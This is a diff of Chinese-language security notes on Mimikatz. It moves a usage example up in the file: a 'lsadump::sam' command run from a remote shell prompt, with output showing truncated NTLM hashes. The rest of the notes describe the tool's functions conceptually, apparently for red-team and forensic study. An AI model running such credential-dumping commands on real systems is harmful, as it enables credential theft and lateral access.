@@ -1,6 +1,43 @@
 # mimikatz
 **Mimikatz** 是一套功能非常多的 Windows 憑證與認證工具，能從記憶體、憑證庫、Kerberos 與加密容器提取或操作多種認證材料（明文密碼、NTLM hash、Kerberos ticket、憑證、DPAPI 資料等），也能用來模擬/注入憑證以達到「通行」或維持存取。它常被紅隊、資安研究員與數位鑑識用於合法測試或調查，但也常遭惡意攻擊者濫用。
 
+## 使用範例
+### get ntlm
+執行 mimikatz  
+成功取得 ntlm
+```bash
+RCE_SHELL$ mimikatz "lsadump::sam" exit
+
+  .#####.   mimikatz 2.2.0 (x86) #18362 Feb 29 2020 11:13:10
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(commandline) # lsadump::sam
+Domain : BLUEPRINT
+SysKey : 147a48de4a9815d2aa479598592b086f
+Local SID : S-1-5-21-3130159037-241736515-3168549210
+
+SAMKey : 3700ddba8f7165462130a4441ef47500
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 5...1
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000003e8 (1000)
+User : Lab
+  Hash NTLM: 3...0
+
+mimikatz(commandline) # exit
+Bye!
+```
+
+
 ## 說明
 
 ### 主要功能（概念性說明）
@@ -72,42 +109,7 @@
 
 Mimikatz 不只是「拿 NTLM」——它是一套針對 Windows 認證機制（LSASS、Kerberos、憑證、DPAPI 等）的探索、提取、與操作工具，能讓擁有足夠權限的人把憑證資源轉化為更廣泛、更持久的存取權；在資訊安全上既是有力的測試/鑑識工具，也是被攻擊者濫用的關鍵工具。
 
-如果你想，我可以再用案例（不含操作步驟）說明攻擊者如何把「單一憑證被盜」擴展成更大影響，或列出常見的偵測信號與對應的日誌來源（例如哪個 Windows 事件 ID 可能有提示）。你要哪一個？
 
-## get ntlm
-執行 mimikatz  
-成功取得 ntlm
-```bash
-RCE_SHELL$ mimikatz "lsadump::sam" exit
-
-  .#####.   mimikatz 2.2.0 (x86) #18362 Feb 29 2020 11:13:10
- .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
- ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
- ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
- '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
-  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
-
-mimikatz(commandline) # lsadump::sam
-Domain : BLUEPRINT
-SysKey : 147a48de4a9815d2aa479598592b086f
-Local SID : S-1-5-21-3130159037-241736515-3168549210
-
-SAMKey : 3700ddba8f7165462130a4441ef47500
-
-RID  : 000001f4 (500)
-User : Administrator
-  Hash NTLM: 5...1
-
-RID  : 000001f5 (501)
-User : Guest
-
-RID  : 000003e8 (1000)
-User : Lab
-  Hash NTLM: 3...0
-
-mimikatz(commandline) # exit
-Bye!
-```
 
 
 ## 參考
